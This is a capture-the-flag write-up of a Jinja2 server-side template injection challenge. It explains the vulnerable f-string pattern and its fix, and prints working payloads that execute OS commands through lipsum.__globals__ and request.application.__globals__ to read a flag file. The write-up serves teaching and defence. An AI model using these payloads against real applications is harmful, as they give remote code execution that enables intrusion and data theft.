# Writeup: Template Terrors

**Category:** Web Exploitation — Server-Side Template Injection (SSTI)
**Difficulty:** Hard
**Flag:** `hoot{j1nj4_t3mpl4t3_pwn3d}`

---

## Overview

The application accepts a name via a POST form and reflects it in a personalised
greeting. The server-side code builds the Jinja2 template using a Python f-string
**before** calling `render_template_string`, so user input is embedded directly
into the template and evaluated by the Jinja2 engine.

This is **Server-Side Template Injection (SSTI)**: the attacker controls the
template itself, not just a variable inside it.

---

## Identifying the Vulnerability

Submit a mathematical expression in Jinja2 syntax:

```
{{7*7}}
```

If the server echoes back `49` instead of the literal string `{{7*7}}`, the input
is being evaluated as a Jinja2 expression — SSTI confirmed.

**XSS vs SSTI:** Submitting `<script>alert(1)</script>` would trigger XSS.
Submitting `{{7*7}}` triggering server-side arithmetic is SSTI. Always test both.

---

## Root Cause

In `app.py`:

```python
tmpl = f'<span>Hello, {name}! Welcome to HootCorp.</span>'
result = render_template_string(tmpl)
```

The f-string substitutes `name` literally into `tmpl`.
If `name = "{{7*7}}"`, `tmpl` becomes `<span>Hello, {{7*7}}! ...</span>`.
`render_template_string` then evaluates `{{7*7}}` as a Jinja2 expression.

---

## Step 1 — Confirm injection

```
POST / name={{7*7}}
```

Response contains `49` — confirmed.

---

## Step 2 — Escalate to file read

Jinja2's global `lipsum` function has access to Python's `os` module through
its `__globals__` dictionary:

```
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
```

Submit this as your name. The server executes `cat /flag` and returns the flag.

---

## Alternative Payloads

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
```

```
{{''.__class__.__mro__[1].__subclasses__()}}
```
(enumerate subclasses → find `subprocess.Popen` or `_io.FileIO` → use it to read files)

---

## Step 3 — Collect the flag

```
hoot{j1nj4_t3mpl4t3_pwn3d}
```

---

## Key Takeaway

**Never embed user input into a template string before rendering.**
The correct pattern is to pass user data as a template variable:

```python
# VULNERABLE
render_template_string(f"Hello, {name}!")

# SAFE — name is a variable, not part of the template source
render_template_string("Hello, {{ name }}!", name=name)
```

In the safe version, `name` is treated as data — Jinja2 auto-escapes it and
never evaluates it as code.
